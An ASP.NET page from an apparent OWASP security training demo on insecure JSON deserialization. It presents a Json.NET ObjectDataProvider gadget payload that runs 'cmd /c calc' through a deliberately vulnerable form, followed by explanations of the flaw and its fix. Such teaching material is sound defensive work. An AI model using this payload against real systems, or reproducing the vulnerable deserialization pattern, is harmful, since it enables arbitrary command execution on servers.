<%@ Page Language="vb" AutoEventWireup="false" MasterPageFile="~/Site.Master" CodeBehind="Demo8.aspx.vb" Inherits="OWASPWebFormsDemos.Demo8" %>

<asp:Content ID="Content1" ContentPlaceHolderID="MainContent" runat="server">
    <div>
        <p>
            <ul>
                <li>Enter the following JSON to be deserialized:<br />
                    {
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": [ "cmd", "/c calc" ]
    },
    "ObjectInstance": { "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" }
}
                </li>
            </ul>
        </p>
        <table class="table table-border">
            <tr>
                <td>
                    <span>Enter json to be deserialized.</span><br />
                    <asp:TextBox runat="server" ID="JSONTextBox" TextMode="MultiLine"></asp:TextBox>
                    <br />
                    <asp:Button runat="server" ID="JSONButton" Text="Submit" OnClick="JSONButton_Click" />
                </td>
            </tr>
        </table>
    </div>

    <div id="accordion">
        <div class="card">
            <div class="card-header" id="headingOne">
                <h5 class="mb-0">
                    <button class="btn" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne" onclick="javascript: return false;">
                        The Problem(s)
                    </button>
                </h5>
            </div>
            <div id="collapseOne" class="collapse" aria-labelledby="headingOne" data-parent="#accordion">
                <div class="card-body">
                    <ul>
                        <li>There is no user input validation / sanitization.</li>
                        <li>Data is deserialized blindly; into a non-specific object</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header" id="headingTwo">
                <h5 class="mb-0">
                    <button class="btn" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo" onclick="javascript: return false;">
                        The Warning Signs / Code "smells" to Watch For
                    </button>
                </h5>
            </div>
            <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordion">
                <div class="card-body">
                    <ul>
                        <li>Watch for any code (globally or locally) that enables type handling / resolution.</li>
                        <li>Deserialization code that doesn't deserialize to a specific type</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header" id="headingThree">
                <h5 class="mb-0">
                    <button class="btn" data-toggle="collapse" data-target="#collapseThree" aria-expanded="true" aria-controls="collapseThree" onclick="javascript: return false;">
                        The Fix
                    </button>
                </h5>
            </div>
            <div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#accordion">
                <div class="card-body">
                    <ul>
                        <li>Never enable type handling on a global basis.</li>
                        <li>Check / sanitize input BEFORE deserialization.</li>
                        <li>Deserialize to specific types (not dynamic or object). If you must use a non-static type, use JObject.</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</asp:Content>
